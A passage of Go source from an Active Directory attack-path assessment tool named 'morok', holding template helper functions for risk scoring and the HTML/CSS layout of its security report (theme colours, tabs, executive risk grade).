
			if e, ok := exploits[targetGroup]; ok {
				return e
			}
			return pathExploitResult{
				Description: "Account has transitive membership in " + targetGroup + " — existing credentials grant the rights of the target group.",
				Commands:    []string{},
				Fix:         "Audit group membership; apply least-privilege; use Tiered Administration.",
				AuditCmd:    "",
			}
		},
		"plural": func(n int, one, many string) string {
			if n == 1 {
				return one
			}
			return many
		},
		// barColor: color reflects % of category's own cap (how saturated this category is).
		"barColor": func(score int, cat string) template.CSS {
			caps := map[string]int{
				"Attack Paths": 30, "Dangerous ACLs": 20, "Kerberoasting": 15,
				"AS-REP Roasting": 10, "Delegation": 15, "ADCS": 20,
				"Policy": 15, "Stale Admins": 10, "No LAPS": 5, "Shadow Creds": 10,
			}
			cap := caps[cat]
			if cap == 0 {
				return template.CSS("var(--bar-sev-medium)")
			}
			pct := score * 100 / cap
			switch {
			case pct >= 75:
				return template.CSS("var(--bar-sev-critical)")
			case pct >= 40:
				return template.CSS("var(--bar-sev-high)")
			default:
				return template.CSS("var(--bar-sev-medium)")
			}
		},
		"capFor": func(cat string) int {
			caps := map[string]int{
				"Attack Paths": 30, "Dangerous ACLs": 20, "Kerberoasting": 15,
				"AS-REP Roasting": 10, "Delegation": 15, "ADCS": 20,
				"Policy": 15, "Stale Admins": 10, "No LAPS": 5, "Shadow Creds": 10,
			}
			if v, ok := caps[cat]; ok {
				return v
			}
			return 10
		},
		// barWidthAbsolute: width as % of the largest cap (30 = Attack Paths).
		// Makes bars visually comparable in absolute terms: score 30 → 100%, score 5 → 17%.
		"barWidthAbsolute": func(score int) int {
			const maxCap = 30
			if score <= 0 {
				return 0
			}
			w := score * 100 / maxCap
			if w < 2 {
				return 2 // minimum visible sliver for non-zero scores
			}
			if w > 100 {
				return 100
			}
			return w
		},
		"isPrivilegedGroup": func(name string) bool {
			privileged := map[string]bool{
				"Domain Admins": true, "Enterprise Admins": true, "Administrators": true,
				"Schema Admins": true, "Account Operators": true, "Backup Operators": true,
				"Server Operators": true, "Print Operators": true, "DnsAdmins": true,
				"Group Policy Creator Owners": true,
			}
			return privileged[name]
		},
		"lower": strings.ToLower,
		"coalesce": func(vals ...string) string {
			for _, v := range vals {
				if v != "" {
					return v
				}
			}
			return ""
		},
	}
}

// ============================================================
// HTML template
// ============================================================

const htmlTemplate = `<!DOCTYPE html>
<html lang="en" data-theme="dark">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>morok — {{.Domain}} — {{.GeneratedAt}}</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:ital,wght@0,300;0,400;1,300;1,400&family=Fraunces:opsz,wght@9..144,300;9..144,400;9..144,600&family=JetBrains+Mono:wght@300;400;500&display=swap" rel="stylesheet">
<script src="https://cdnjs.cloudflare.com/ajax/libs/d3/7.8.5/d3.min.js"></script>
<style>
/* ── Theme variables ─────────────────────────────────────────── */
:root {
  --brand-primary: #c9a961;
  --brand-light:   #f3c97a;
  --brand-dark:    #8b1e3f;
}
html[data-theme="dark"] {
  --bg-page:       #0f1117;
  --bg-card:       #1a1f2e;
  --bg-hover:      #2d3748;
  --bg-code:       #111827;
  --bg-code-inner: #0a0e1a;
  --bg-grouped:    #1a202c;
  --bg-input:      #0f1117;
  --border:        #2d3748;
  --text-main:     #e2e8f0;
  --text-muted:    #718096;
  --text-secondary:#a0aec0;
  --text-subtle:   #4a5568;
  --accent:        #63b3ed;
  --accent-domain: #f6ad55;
  --color-ok:      #68d391;
  --badge-ok-bg:   #1c4532;   --badge-ok-txt:   #68d391;
  --badge-med-bg:  #744210;   --badge-med-txt:  #f6ad55;
  --badge-high-bg: #7b2d12;   --badge-high-txt: #fdba74;
  --badge-crit-bg: #742a2a;   --badge-crit-txt: #e53e3e;
  --text-sev-critical: #e53e3e;
  --text-sev-high:     #dd6b20;
  --text-sev-medium:   #d69e2e;
  --bar-sev-critical:  #e53e3e;
  --bar-sev-high:      #dd6b20;
  --bar-sev-medium:    #d69e2e;
  --sev-critical:      #e53e3e;
  --sev-high:          #dd6b20;
  --sev-medium:        #d69e2e;
  --node-user:     #63b3ed;
  --node-computer: #90cdf4;
  --node-group:    #b794f4;
  --node-admin:    #fc8181;
  --mark-bg:       #f6e05e;
  --mark-txt:      #1a202c;
  --chart-count-txt: #ffffff;
  --gs-match-bg:   #1a56db;   --gs-match-txt:   #ffffff;
}
html[data-theme="light"] {
  --bg-page:       #f0f4f8;
  --bg-card:       #ffffff;
  --bg-hover:      #edf2f7;
  --bg-code:       #edf2f7;
  --bg-code-inner: #e2e8f0;
  --bg-grouped:    #f7fafc;
  --bg-input:      #ffffff;
  --border:        #cbd5e0;
  --text-main:     #1a202c;
  --text-muted:    #4a5568;
  --text-secondary:#718096;
  --text-subtle:   #a0aec0;
  --accent:        #2b6cb0;
  --accent-domain: #c05621;
  --color-ok:      #276749;
  --badge-ok-bg:   #c6f6d5;   --badge-ok-txt:   #276749;
  --badge-med-bg:  #feebc8;   --badge-med-txt:  #744210;
  --badge-high-bg: #fed7ae;   --badge-high-txt: #7b341e;
  --badge-crit-bg: #fed7d7;   --badge-crit-txt: #c53030;
  --text-sev-critical: #c53030;
  --text-sev-high:     #c2410c;
  --text-sev-medium:   #92400e;
  --bar-sev-critical:  #e53e3e;
  --bar-sev-high:      #ed8936;
  --bar-sev-medium:    #d69e2e;
  --sev-critical:      #c53030;
  --sev-high:          #c2410c;
  --sev-medium:        #92400e;
  --node-user:     #2b6cb0;
  --node-computer: #2c5282;
  --node-group:    #6b46c1;
  --node-admin:    #c53030;
  --mark-bg:       #fef08a;
  --mark-txt:      #1a202c;
  --chart-count-txt: #1a202c;
  --gs-match-bg:   #1a56db;   --gs-match-txt:   #ffffff;
}

* { box-sizing: border-box; margin: 0; padding: 0; }
body { font-family: 'Segoe UI', system-ui, sans-serif; background: var(--bg-page); color: var(--text-main); }

/* Header */
.header { border-bottom: 1px solid var(--border);
  display: flex; align-items: stretch; gap: 0; }
.header-logo { display: flex; align-items: center; gap: 14px; flex-shrink: 0;
  padding: 20px 30px; }
.header-logo-text { display: flex; flex-direction: column; gap: 2px; }
.header-logo-name { font-family: 'Fraunces', serif; font-size: 1.6rem; font-weight: 300; letter-spacing: 0.02em; color: #e8e4d8; line-height: 1; }
.header-logo-tagline { font-family: 'JetBrains Mono', monospace; font-size: 0.6rem; font-weight: 400; letter-spacing: 0.28em; color: #8a8475; text-transform: uppercase; line-height: 1.4; }
.header-logo-tag { font-family: 'JetBrains Mono', monospace; font-size: 0.58rem; letter-spacing: 0.14em; color: #8a8475; text-transform: uppercase; opacity: 0.7; }
/* L3 — light theme text inversion (geometry unchanged) */
html[data-theme="light"] .header-logo-name    { color: #1a1f2e; }
html[data-theme="light"] .header-logo-tagline { color: #8a6a3e; }
html[data-theme="light"] .header-logo-tag     { color: #8a6a3e; opacity: 0.85; }
html[data-theme="light"] .header-logo svg line { stroke: #b8954a; opacity: 0.85; }
html[data-theme="light"] .header-logo svg circle[fill="#c9a961"] { fill: #b8954a; }
html[data-theme="light"] .header-logo svg circle[stroke="#c9a961"] { stroke: #b8954a; }
html[data-theme="light"] .header-logo svg path[fill="#0a0d14"] { fill: #faf8f3; }
.header .meta { color: var(--text-muted); font-size: 0.82rem; padding: 20px 30px; flex: 0 0 auto; }
.header .domain { color: var(--accent-domain); font-weight: 600; }
.findings-row { margin-left: auto; padding: 20px; display: flex; gap: 6px; align-items: center; }

/* Theme toggle button */
#theme-toggle { align-self: center; margin: 0 20px 0 8px;
  background: var(--bg-hover); border: 1px solid var(--border); color: var(--text-muted);
  border-radius: 6px; padding: 5px 11px; cursor: pointer; font-size: 1rem;
  transition: background 0.2s, border-color 0.2s; }
#theme-toggle:hover { border-color: var(--accent); color: var(--text-main); }

/* Global search */
.global-search-wrap { padding: 10px 40px; background: var(--bg-card); border-bottom: 1px solid var(--border);
  display: flex; align-items: center; gap: 12px; }
.global-search-wrap input { flex: 1; max-width: 420px; padding: 7px 14px;
  background: var(--bg-input); border: 1px solid var(--border); border-radius: 6px;
  color: var(--text-main); font-size: 0.9rem; outline: none; }
.global-search-wrap input:focus { border-color: var(--accent); }
.global-search-wrap input::placeholder { color: var(--text-subtle); }
#gs-results { display:flex; flex-wrap:wrap; gap:4px; align-items:center; min-width:0; }
.gs-tab-btn { background:var(--bg-hover); border:1px solid var(--border); border-radius:5px;
  color:var(--text-main); padding:3px 10px; font-size:0.78rem; cursor:pointer; white-space:nowrap; }
.gs-tab-btn:hover { border-color:var(--accent); background:var(--accent); color:#fff; }
.gs-no-match { font-size:0.82rem; color:var(--text-muted); }
.gs-match { background: var(--gs-match-bg) !important; color: var(--gs-match-txt) !important;
  border-radius: 2px; padding: 0 2px; }

/* Nav tabs */
.nav { display: flex; gap: 0; padding: 0 0 0 28px;
  background: var(--bg-card); border-bottom: 1px solid var(--border);
  flex-wrap: nowrap; overflow-x: auto; scrollbar-width: none;
  position: sticky; top: 0; z-index: 50; }
.nav::-webkit-scrollbar { display: none; }
.nav::after { content: ''; min-width: 8px; flex-shrink: 0; }
.nav button { padding: 10px 13px; border: none; background: transparent;
  color: var(--text-muted); cursor: pointer; font-size: 0.83rem; border-bottom: 2px solid transparent;
  transition: all 0.2s; white-space: nowrap; flex-shrink: 0; }
.nav button:hover { color: var(--text-main); }
.nav button.active { color: var(--accent); border-bottom-color: var(--accent); }

/* Content */
.content { padding: 32px 40px; }
.tab-pane { display: none; }
.tab-pane.active { display: block; }

/* Summary cards */
.cards { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
  gap: 16px; margin-bottom: 32px; }
.card { background: var(--bg-card); border: 1px solid var(--border); border-radius: 8px;
  padding: 20px; text-align: center; display: flex; flex-direction: column;
  align-items: center; justify-content: center; min-height: 90px; }
.card .value { font-size: 2rem; font-weight: 700; color: var(--accent); line-height: 1; }
.card .label { font-size: 0.8rem; color: var(--text-muted); margin-top: 6px;
  text-transform: uppercase; letter-spacing: 0.05em; }
.card.critical .value { color: var(--text-sev-critical); }
.card.warning .value { color: var(--text-sev-high); }
.card.ok .value { color: var(--color-ok); }
.card[onclick] { cursor: pointer; transition: border-color 0.15s, transform 0.12s; }
.card[onclick]:hover { border-color: var(--accent); transform: translateY(-2px); }

/* Accordion */
.acc-toggle { display: flex; align-items: center; gap: 8px; cursor: pointer;
  margin-top: 10px; padding: 7px 12px; background: var(--bg-hover); border-radius: 6px;
  font-size: 0.78rem; color: var(--text-secondary); user-select: none; border: none; width: 100%;
  text-align: left; }
.acc-toggle:hover { filter: brightness(1.08); color: var(--text-main); }
.acc-body { display: none; padding: 12px 14px; margin-top: 2px;
  background: var(--bg-code); border: 1px solid var(--border); border-radius: 6px;
  font-size: 0.82rem; line-height: 1.6; }
.acc-body.open { display: block; }
.acc-cmd { font-family: monospace; background: var(--bg-code-inner); padding: 4px 8px;
  border-radius: 4px; color: var(--color-ok); font-size: 0.78rem; display: block; margin-top: 4px;
  word-break: break-word; white-space: pre-wrap; padding-right: 36px; }
.acc-cmd-wrap { position: relative; display: block; margin-top: 4px; }
.acc-cmd-wrap .acc-cmd { margin-top: 0; }
.acc-cmd-copy { position: absolute; top: 4px; right: 4px; background: transparent;
  border: 1px solid var(--border); border-radius: 4px; color: var(--text-muted);
  padding: 2px 6px; cursor: pointer; font-size: 0.75rem; transition: all 0.15s; }
.acc-cmd-copy:hover { color: var(--accent); border-color: var(--accent); }
.acc-cmd-copy.copied { color: var(--color-ok); border-color: var(--color-ok); }
.acc-label { color: var(--text-muted); font-size: 0.75rem; text-transform: uppercase;
  letter-spacing: 0.05em; margin-top: 8px; }

/* Badges */
.badge { display: inline-block; padding: 2px 8px; border-radius: 4px;
  font-size: 0.75rem; font-weight: 600; }
.badge-ok { background: var(--badge-ok-bg); color: var(--badge-ok-txt); }
.badge-medium { background: var(--badge-med-bg); color: var(--badge-med-txt); }
.badge-high { background: var(--badge-high-bg); color: var(--badge-high-txt); }
.badge-critical { background: var(--badge-crit-bg); color: var(--badge-crit-txt); }
.mitre-badge { display: inline-block; padding: 1px 6px; border-radius: 3px;
  font-size: 0.7rem; font-weight: 600; font-family: monospace;
  background: #2d1b69; color: #a78bfa; text-decoration: none;
  border: 1px solid #4c1d95; vertical-align: middle; margin-left: 4px; }
.mitre-badge:hover { background: #4c1d95; color: #c4b5fd; }
[data-theme="light"] .mitre-badge { background: #ede9fe; color: #5b21b6; border-color: #c4b5fd; }
[data-theme="light"] .mitre-badge:hover { background: #ddd6fe; }

/* Severity */
.sev-critical { color: var(--text-sev-critical); font-weight: 700; }
.sev-high     { color: var(--text-sev-high); font-weight: 600; }
.sev-medium   { color: var(--text-sev-medium); }

/* CVSS score pill */
.cvss-score {
  display: inline-block;
  font-size: 11px;
  font-weight: 700;
  font-family: var(--font-mono);
  background: rgba(255,255,255,0.08);
  border: 1px solid rgba(255,255,255,0.15);
  border-radius: 4px;
  padding: 1px 6px;
  color: var(--text-secondary);
  letter-spacing: 0.03em;
  cursor: pointer;
  position: relative;
  user-select: none;
}
.cvss-score:hover { background: rgba(255,255,255,0.16); color: var(--text-main); }
.cvss-score[data-copied] { background: var(--color-ok) !important; color: #000 !important; border-color: var(--color-ok) !important; transition: background 0.15s, color 0.15s, border-color 0.15s; }
.cvss-score[data-copied]::after { content: '✓'; position: absolute; top: -18px; left: 50%;
  transform: translateX(-50%); font-size: 11px; color: var(--color-ok); pointer-events: none; }
[data-theme="light"] .cvss-score {
  background: rgba(0,0,0,0.05);
  border-color: rgba(0,0,0,0.12);
  color: var(--text-main);
}
[data-theme="light"] .cvss-score:hover { background: rgba(0,0,0,0.1); color: var(--text-main); }

/* Severity row left-border indicators */
tr.row-critical td:first-child { border-left: 3px solid var(--text-sev-critical); }
tr.row-high     td:first-child { border-left: 3px solid var(--text-sev-high); }
tr.row-medium   td:first-child { border-left: 3px solid var(--text-sev-medium); }
tr.row-low      td:first-child { border-left: 3px solid var(--color-ok); }

/* Tables */
.table-wrap { overflow-x: auto; border-radius: 8px;
  border: 1px solid var(--border); margin-bottom: 24px; }
table { width: 100%; border-collapse: collapse; font-size: 0.85rem; }
th { background: var(--bg-card); color: var(--text-muted); padding: 10px 14px;
  text-align: left; font-weight: 500; text-transform: uppercase;
  font-size: 0.75rem; letter-spacing: 0.05em; position: relative; user-select: none; }
td { padding: 10px 14px; border-top: 1px solid var(--border); color: var(--text-main); }
/* Column resize handle */
.col-rh { position: absolute; right: 0; top: 20%; width: 3px; height: 60%;
  cursor: col-resize; z-index: 2; border-radius: 2px;
  background: var(--border); opacity: 0.6; }
.col-rh:hover, .col-rh.active { background: var(--accent); opacity: 1; width: 4px; }
th.col-over { box-shadow: inset 2px 0 0 var(--accent); }
th.col-dragging { opacity: 0.35; }
tr:hover td { background: var(--bg-hover); }
.mono { font-family: monospace; font-size: 0.8rem; color: var(--text-secondary); }
.txt-yes  { color: var(--color-ok); font-weight: 600; }
.txt-warn { color: var(--text-sev-high); font-weight: 600; }
.row-priv td:first-child { border-left: 3px solid var(--text-sev-critical); }

/* Attack paths */
.path-card { background: var(--bg-card); border: 1px solid var(--border);
  border-radius: 8px; margin-bottom: 16px; overflow: hidden; }
.path-header { padding: 12px 16px; display: flex; align-items: center;
  gap: 12px; border-bottom: 1px solid var(--border); }
.path-body { padding: 16px; }
.path-chain { display: flex; align-items: center; flex-wrap: wrap; gap: 8px; }
.path-node { display: flex; align-items: center; gap: 6px;
  background: var(--bg-hover); border-radius: 6px; padding: 6px 12px;
  font-size: 0.85rem; }
.path-node.is-admin { border: 1px solid var(--text-sev-critical); }
.path-node.is-kerb  { border: 1px solid var(--text-sev-high); }
.path-arrow { color: var(--text-subtle); font-size: 1.2rem; }
.path-edge-label { font-size: 0.7rem; color: var(--text-subtle); }

/* D3 Graph */
#graph-container { background: var(--bg-card); border: 1px solid var(--border);
  border-radius: 8px; height: 500px; position: relative; overflow: hidden; }
#graph-svg { width: 100%; height: 100%; }
.node-label { font-size: 11px; fill: var(--text-main); pointer-events: none; }
.link { stroke: var(--text-subtle); stroke-opacity: 0.6; stroke-width: 1.5px; }
.node circle { stroke-width: 2px; cursor: pointer; }

/* Section title */
.section-title { font-size: 1.1rem; color: var(--text-main); margin-bottom: 16px;
  padding-bottom: 8px; border-bottom: 1px solid var(--border); display:flex; align-items:center; gap:8px; flex-wrap:wrap; }
.section-title span { color: var(--text-muted); font-size: 0.85rem; font-weight: 400; }

/* Help icon tooltip */
.help-icon { display:inline-flex; align-items:center; justify-content:center;
  width:16px; height:16px; border-radius:50%; background:var(--bg-hover); color:var(--text-secondary);
  font-size:10px; font-weight:700; cursor:default; position:relative;
  flex-shrink:0; margin-left:2px; }
#help-tip { display:none; position:fixed; z-index:1000; background:var(--bg-grouped);
  border:1px solid var(--text-subtle); color:var(--text-main); font-size:0.78rem;
  font-weight:400; line-height:1.5; padding:10px 14px; border-radius:6px;
  white-space:pre-wrap; width:300px; max-width:calc(100vw - 24px);
  pointer-events:none; box-shadow:0 4px 16px rgba(0,0,0,.4); }

/* Table filters */
.filter-bar { display: flex; flex-wrap: wrap; gap: 8px; margin-bottom: 12px; align-items: center; }
.filter-bar input[type=text] {
  background: var(--bg-card); border: 1px solid var(--border); border-radius: 6px;
  color: var(--text-main); padding: 6px 10px; font-size: 0.8rem; outline: none;
  min-width: 180px; }
.filter-bar input[type=text]:focus { border-color: var(--accent); }
.filter-bar select {
  background: var(--bg-card); border: 1px solid var(--border); border-radius: 6px;
  color: var(--text-main); padding: 6px 10px; font-size: 0.8rem; outline: none;
  cursor: pointer; }
.filter-bar select:focus { border-color: var(--accent); }
.filter-bar .filter-count { font-size: 0.78rem; color: var(--text-muted); margin-left: auto; }
.filter-bar button {
  background: var(--bg-hover); border: none; border-radius: 6px; color: var(--text-secondary);
  padding: 6px 12px; font-size: 0.78rem; cursor: pointer; }
.filter-bar button:hover { background: var(--border); color: var(--text-main); }

/* Sortable table headers */
th.sortable { cursor: pointer; user-select: none; }
th.sortable:hover { color: var(--text-main); background: var(--bg-hover); }
th.sort-asc::after  { content: ' ▲'; color: var(--accent); }
th.sort-desc::after { content: ' ▼'; color: var(--accent); }

/* Collapsible exposure sections */
.exp-section { border:1px solid var(--border); border-radius:8px; margin-bottom:10px; }
.exp-header { display:flex; align-items:center; gap:10px; padding:12px 16px;
  background:var(--bg-grouped); cursor:pointer; user-select:none;
  border-radius:8px; }
.exp-section:has(.exp-body:not([style*="none"])) .exp-header { border-radius:8px 8px 0 0; }
.exp-header:hover { filter:brightness(1.06); }
.exp-header .exp-title { font-weight:600; color:var(--text-main); font-size:0.9rem; }
.exp-body { padding:16px; border-top:1px solid var(--border); }
.chevron { display:inline-block; font-size:11px; color:var(--text-secondary); min-width:12px; user-select:none; }

/* Expand/Collapse all buttons */
.xp-btns { display:flex; gap:6px; margin-left:auto; }
.xp-btns button { background:var(--bg-hover); border:1px solid var(--border); border-radius:5px;
  color:var(--text-secondary); padding:4px 11px; font-size:0.76rem; cursor:pointer; white-space:nowrap; }
.xp-btns button:hover { border-color:var(--accent); color:var(--text-main); }

/* Row-limit "Show all" button */
.show-all-btn { display:block; width:100%; margin-top:6px; padding:8px;
  background:var(--bg-hover); border:1px solid var(--border); border-radius:6px;
  color:var(--accent); font-size:0.82rem; cursor:pointer; text-align:center; }
.show-all-btn:hover { border-color:var(--accent); background:var(--bg-card); }

/* Graph truncation warning */
.graph-warn { position:absolute; top:8px; left:50%; transform:translateX(-50%);
  background:var(--bg-grouped); border:1px solid var(--border); border-radius:6px;
  padding:5px 14px; font-size:0.78rem; color:var(--text-muted); white-space:nowrap; pointer-events:none; }
.print-cover { display: none; }
@media print {
  html { background: #fff !important; color: #000 !important; }
  html[data-theme="dark"] {
    --bg-page: #fff; --bg-card: #fff; --bg-hover: #f5f5f5;
    --bg-code: #f5f5f5; --bg-code-inner: #eee; --bg-grouped: #f9f9f9;
    --bg-input: #fff; --border: #ccc;
    --text-main: #000; --text-muted: #555; --text-secondary: #333; --text-subtle: #888;
    --accent: #1a56db; --accent-domain: #c05621; --color-ok: #166534;
  }
  .print-cover { display: block !important; page-break-after: always; }
  .print-cover-grade { font-size: 8rem; font-weight: 800; }
  .nav, .global-search-wrap, #theme-toggle, .xp-btns, .filter-bar,
  .show-all-btn, #gs-clear, #graph-tooltip { display: none !important; }
  .tab-pane { display: block !important; }
  .tab-pane:not(:first-of-type) { page-break-before: always; }
  .acc-body, .exp-body, .group-body { display: block !important; }
  .path-card, .acl-card, .card, .exp-section { page-break-inside: avoid; }
  * { box-shadow: none !important; transition: none !important; }
  h2.section-title { page-break-after: avoid; }
  a[href^="http"]::after { content: " (" attr(href) ")"; font-size: 0.7em; color: #666; }
}
</style>
</head>
<body>
<div id="help-tip"></div>

<div class="print-cover" style="text-align:center;padding:80px 40px">
  <h1 style="font-size:2.5rem;margin-bottom:16px">Active Directory Security Assessment</h1>
  <div style="font-size:1.5rem;color:var(--text-secondary);margin-bottom:48px">{{.Domain}}</div>
  <div class="print-cover-grade" style="color:{{.RiskScore.GradeColor}}">{{.RiskScore.Grade}}</div>
  <div style="font-size:1.2rem;color:var(--text-muted);margin-top:16px">Risk Score: {{.RiskScore.Total}}/100</div>
  <div style="margin-top:80px;color:var(--text-muted)">Generated by morok v{{.Version}} &middot; {{.GeneratedAt}}</div>
</div>

<div class="header">
  <div class="header-logo">
    <svg width="52" height="52" viewBox="0 0 200 200" xmlns="http://www.w3.org/2000/svg">
      <defs>
        <radialGradient id="hiris" cx="50%" cy="50%" r="50%">
          <stop offset="0%" stop-color="#f3c97a" stop-opacity="0.35"/>
          <stop offset="60%" stop-color="#c9a961" stop-opacity="0.15"/>
          <stop offset="100%" stop-color="#c9a961" stop-opacity="0"/>
        </radialGradient>
      </defs>
      <g transform="translate(100,100)">
        <circle cx="0" cy="0" r="65" fill="url(#hiris)"/>
        <circle cx="0" cy="0" r="65" fill="none" stroke="#c9a961" stroke-width="0.7" opacity="0.4"/>
        <line x1="0" y1="0" x2="-31" y2="-31" stroke="#c9a961" stroke-width="1.4" opacity="0.75"/>
        <line x1="0" y1="0" x2="31" y2="-31" stroke="#c9a961" stroke-width="1.4" opacity="0.75"/>
        <line x1="0" y1="0" x2="-36" y2="22" stroke="#c9a961" stroke-width="1.4" opacity="0.75"/>
        <line x1="0" y1="0" x2="36" y2="22" stroke="#c9a961" stroke-width="1.4" opacity="0.75"/>
        <line x1="0" y1="0" x2="0" y2="-38" stroke="#c9a961" stroke-width="1.4" opacity="0.75"/>
        <line x1="0" y1="0" x2="0" y2="40" stroke="#c9a961" stroke-width="1.4" opacity="0.75"/>
        <circle cx="-31" cy="-31" r="3.5" fill="#c9a961"/>
        <circle cx="31" cy="-31" r="3.5" fill="#c9a961"/>
        <circle cx="-36" cy="22" r="3.5" fill="#c9a961"/>
        <circle cx="36" cy="22" r="3.5" fill="#c9a961"/>
        <circle cx="0" cy="-38" r="3.5" fill="#c9a961"/>
        <circle cx="0" cy="40" r="3.5" fill="#c9a961"/>
        <path d="M 0 -12 L 12 0 L 0 12 L -12 0 Z" fill="#0a0d14" stroke="#8b1e3f" stroke-width="2"/>
        <circle cx="0" cy="0" r="3" fill="#c9a961"/>
      </g>
    </svg>
    <div class="header-logo-text">
      <div class="header-logo-name">Morok</div>
      <div class="header-logo-tagline">SEE · THROUGH · THE · FOG</div>
      <div class="header-logo-tag">v{{.Version}} · AD Attack Path Analysis</div>
    </div>
  </div>
  <div class="meta">
    Domain: <span class="domain">{{.Domain}}</span> &nbsp;|&nbsp;
    Auth: <span style="color:var(--color-ok)">{{.AuthMethod}}</span> &nbsp;|&nbsp;
    Generated: {{.GeneratedAt}}
  </div>
  <div class="findings-row">
    {{if gt .TotalCritical 0}}<span class="badge badge-critical" style="font-size:0.76rem">{{.TotalCritical}} Critical</span>{{end}}
    {{if gt .TotalHigh 0}}<span class="badge badge-high" style="font-size:0.76rem">{{.TotalHigh}} High</span>{{end}}
    {{if gt .TotalMedium 0}}<span class="badge badge-medium" style="font-size:0.76rem">{{.TotalMedium}} Medium</span>{{end}}
    {{if and (eq .TotalCritical 0) (eq .TotalHigh 0) (eq .TotalMedium 0)}}<span class="badge badge-ok" style="font-size:0.76rem">Clean</span>{{end}}
  </div>
  <button id="theme-toggle" onclick="toggleTheme()" aria-label="Toggle dark/light theme" title="Toggle light/dark mode">🌙</button>
</div>

<div class="global-search-wrap">
  <input id="gs-input" type="text" aria-label="Global search across all report tabs" placeholder="🔍  Global search across all tabs..."
    oninput="gsHighlight(this.value)" onkeydown="if(event.key==='Enter'){event.preventDefault();gsNavigateFirst();}" autocomplete="off">
  <span id="gs-results"></span>
  <button id="gs-clear" onclick="clearGlobalSearch()" style="background:var(--bg-hover);border:none;color:var(--text-secondary);
    padding:6px 12px;border-radius:6px;cursor:pointer;font-size:0.82rem;display:none">✕ Clear</button>
</div>

<div class="nav" role="tablist">
  <button role="tab" aria-selected="true" aria-controls="tab-executive" id="tab-btn-executive" class="active" onclick="showTab('executive')">Executive</button>
  <button role="tab" aria-selected="false" aria-controls="tab-summary" id="tab-btn-summary" onclick="showTab('summary')">Summary</button>
  <button role="tab" aria-selected="false" aria-controls="tab-paths" id="tab-btn-paths" onclick="showTab('paths')">Attack Paths ({{.Summary.AttackPathsCount}})</button>
  <button role="tab" aria-selected="false" aria-controls="tab-graph" id="tab-btn-graph" onclick="showTab('graph')">Graph</button>
  <button role="tab" aria-selected="false" aria-controls="tab-kerberos" id="tab-btn-kerberos" onclick="showTab('kerberos')">Kerberos</button>
  <button role="tab" aria-selected="false" aria-controls="tab-acl" id="tab-btn-acl" onclick="showTab('acl')">ACL ({{.Summary.DangerousACLCount}})</button>
  <button role="tab" aria-selected="false" aria-controls="tab-delegation" id="tab-btn-delegation" onclick="showTab('delegation')">Delegation ({{.Summary.DelegationCount}})</button>
  <button role="tab" aria-selected="false" aria-controls="tab-exposure" id="tab-btn-exposure" onclick="showTab('exposure')">Exposure</button>
  <button role="tab" aria-selected="false" aria-controls="tab-gpo" id="tab-btn-gpo" onclick="showTab('gpo')">GPO</button>
  <button role="tab" aria-selected="false" aria-controls="tab-adcs" id="tab-btn-adcs" onclick="showTab('adcs')">ADCS {{if gt .Summary.ADCSTemplateCount 0}}({{.Summary.ADCSTemplateCount}}){{end}}</button>
  <button role="tab" aria-selected="false" aria-controls="tab-trusts" id="tab-btn-trusts" onclick="showTab('trusts')">Trusts {{if .TrustResult}}{{if .TrustResult.Trusts}}({{len .TrustResult.Trusts}}){{end}}{{end}}</button>
  <button role="tab" aria-selected="false" aria-controls="tab-shadow" id="tab-btn-shadow" onclick="showTab('shadow')">Shadow Creds {{if gt .Summary.ShadowCredCount 0}}({{.Summary.ShadowCredCount}}){{end}}</button>
  <button role="tab" aria-selected="false" aria-controls="tab-ldapsec" id="tab-btn-ldapsec" onclick="showTab('ldapsec')">LDAP Security {{if .LDAPSecurityResult}}{{if and .LDAPSecurityResult.SigningChecked (not .LDAPSecurityResult.SigningEnforced)}}⚠{{end}}{{end}}</button>
  <button role="tab" aria-selected="false" aria-controls="tab-audit" id="tab-btn-audit" onclick="showTab('audit')">Audit {{if gt .Summary.AuditFindingCount 0}}({{.Summary.AuditFindingCount}}){{end}}</button>
  <button role="tab" aria-selected="false" aria-controls="tab-sysvol" id="tab-btn-sysvol" onclick="showTab('sysvol')">SYSVOL{{if .SYSVOLResult}}{{if .SYSVOLResult.Findings}} ({{len .SYSVOLResult.Findings}}){{end}}{{end}}</button>
  <button role="tab" aria-selected="false" aria-controls="tab-users" id="tab-btn-users" onclick="showTab('users')">Users ({{.Summary.TotalUsers}})</button>
  <button role="tab" aria-selected="false" aria-controls="tab-groups" id="tab-btn-groups" onclick="showTab('groups')">Groups ({{.Summary.TotalGroups}})</button>
  <button role="tab" aria-selected="false" aria-controls="tab-computers" id="tab-btn-computers" onclick="showTab('computers')">Computers ({{.Summary.TotalComputers}})</button>
  <button role="tab" aria-selected="false" aria-controls="tab-history" id="tab-btn-history" onclick="showTab('history')">History</button>
</div>

<div class="content">

<!-- EXECUTIVE TAB -->
<div id="tab-executive" class="tab-pane active" role="tabpanel" aria-labelledby="tab-btn-executive" tabindex="0" aria-hidden="false">

  <!-- Hero: domain + risk grade -->
  <div style="display:grid;grid-template-columns:1fr auto;gap:32px;padding:32px;
    background:var(--bg-card);border:1px solid var(--border);border-radius:12px;margin-bottom:24px">
    <div>
      <div style="font-size:0.75rem;color:var(--text-muted);text-transform:uppercase;
        letter-spacing:0.1em;margin-bottom:8px">Active Directory Security Assessment</div>
      <h1 style="font-size:2rem;color:var(--text-main);margin-bottom:8px">{{.Domain}}</h1>
      <div style="color:var(--text-secondary);font-size:0.9rem">
        Assessed {{.GeneratedAt}} &middot; {{.Summary.TotalUsers}} users &middot; {{.Summary.TotalComputers}} computers &middot; {{.Summary.TotalGroups}} groups
      </div>
    </div>
    <div style="text-align:center;padding:0 24px;border-left:1px solid var(--border)">
      <div style="font-size:5rem;font-weight:800;line-height:1;color:{{.RiskScore.GradeColor}}">{{.RiskScore.Grade}}</div>
      <div style="font-size:0.7rem;color:var(--text-muted);text-transform:uppercase;
        letter-spacing:0.1em;margin-top:8px">{{.RiskScore.Total}}/100 Risk</div>
    </div>
  </div>

  {{if .TopIssues}}
  <!-- Top issues -->
  <div style="font-size:11px;font-weight:500;color:var(--text-muted);text-transform:uppercase;
    letter-spacing:.06em;margin-bottom:8px">Top Issues Requiring Immediate Action</div>
  <div style="background:var(--bg-card);border:1px solid var(--border);border-radius:8px;margin-bottom:24px;overflow:hidden">
    {{range $i, $issue := .TopIssues}}
